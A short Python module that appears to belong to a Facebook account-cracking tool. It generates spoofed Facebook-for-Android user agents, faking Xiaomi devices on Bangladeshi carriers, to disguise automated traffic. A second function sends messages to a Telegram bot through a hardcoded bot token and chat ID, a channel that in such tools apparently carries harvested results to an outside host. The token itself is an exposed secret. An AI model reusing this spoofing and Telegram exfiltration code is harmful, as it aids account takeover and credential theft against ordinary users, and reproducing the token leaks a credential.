import random
import requests
def useragent():
    fbks = (
        'com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
    enCRACK1 = ['en_GB', 'en_US']
    CRACKsim1 = ['Banglalink', 'Grameenphone', 'Robi', 'Airtel', 'Teletalk']
    modelxxx = [
        "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I",
    ]
    gtt = random.choice(modelxxx)
    android_version = str(random.randint(6, 13))
    fbav = f"{random.randint(111, 111)}.{random.randint(111, 999)}.{random.randint(111, 999)}.{random.randint(111, 999)}"
    fbbv = str(random.randint(111111111, 999999999))
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua

def prints(message):
    """
    Send a formatted message to Telegram.
    """
    bot_token = "7696072927:AAHCieEIUD2UVr5alMwZqyIPhVGjPUqr3KU"  # Replace with your bot token
    chat_id = "7352132358"  # Replace with your chat ID
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # Send the request to Telegram
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"  # Optional: Remove if you don't need HTML parsing
    }
    try:
        response = requests.post(telegram_url, data=data)
        if response.status_code == 200:
            print("Message sent to Telegram successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print("Error sending message to Telegram:", e)
